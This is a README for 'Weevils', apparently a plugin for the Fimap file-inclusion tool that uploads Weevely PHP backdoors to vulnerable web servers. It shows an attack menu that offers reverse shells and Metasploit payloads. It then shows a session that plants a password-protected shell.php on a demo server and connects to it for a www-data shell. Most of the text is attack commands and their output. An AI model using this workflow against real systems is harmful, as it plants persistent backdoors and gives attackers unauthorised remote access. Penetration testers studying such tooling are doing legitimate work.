Weevils - Fimap Plugin that Injects Weevely Backdoors via Fimap.

Author:    Darren "Infodox" Martyn.
Email:     infodox@insecurety.net
Twitter:   twitter.com/info_dox
Site:      http://insecurety.net/
Usage:     Just add this to the plugins folder in Fimap, should work fine as-is.

Example:
#########################################################
#:: Available Attacks - PHP and SHELL access ::         #
#########################################################
#[1] Spawn fimap shell                                  #
#[2] Spawn pentestmonkey's reverse shell                #
#[3] [Upload Weevely] Uploads a Weevily Backdoor        #
#[4] [msf_bindings] Executes MSF reverse payloads       #
#[5] [Test Plugin] Show some info                       #
#[6] [reverse http shell] Loads a reverse HTTP shell    #
#[q] Quit                                               #
#########################################################
Choose Attack: 3
Shell not existing... Making Shell
Backdoor Password Please: lolcatsFTW

Weevely 0.6 - Generate and manage stealth PHP backdoors
              Emilio Pinna 2011-2012            

+ Backdoor file 'shell.php' created with password 'lolcatsFTW'.
Uploading client to /var/www/inclusiondemo/shell.php
Uploaded 593 bytes
Uploaded! Now use Weevely to connect!

# 
Now to connect you just use Weevely. This plugin does NOT automatically launch Weevely (YET).
Later I may add an auto-connect but for now it is not on the cards.
#
Connecting:
root@bt:/weevely# python weevely.py http://localhost/inclusiondemo/shell.php lolcatsFTW

Weevely 0.6 - Generate and manage stealth PHP backdoors
              Emilio Pinna 2011-2012            

[+] Starting terminal. Shell probe may take a while...

[+] List modules with <tab> and show help with :show [module name]

www-data@bt:/var/www/inclusiondemo$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@bt:/var/www/inclusiondemo$ 

# BOOM! Got Shell!


### Known Issues ###
* This plugin does NOT work with /var/log/auth.log injection (ssh injection) yet. This is due to haxhelper not really liking said injection method for some reason.
* This plugin does NOT yet auto connect, as my normal method of popping an XTERM to connect did not seem like a great idea.
* This plugin is still in Beta. Report any bugs in my code, PLEASE!

### Greetings and Credits ###
imax for writing Fimap!
Emilio Pinna for writing Weevely
ohdae for making me feel I HAD to write something :P
pr0f for inspiration in general.

### NOTICE ###
This software uses Weevely - code.google.com/p/weevely - as part of it. 
If they have an issue with this they should contact me, as I am using their code out of respect for its awesomeness.
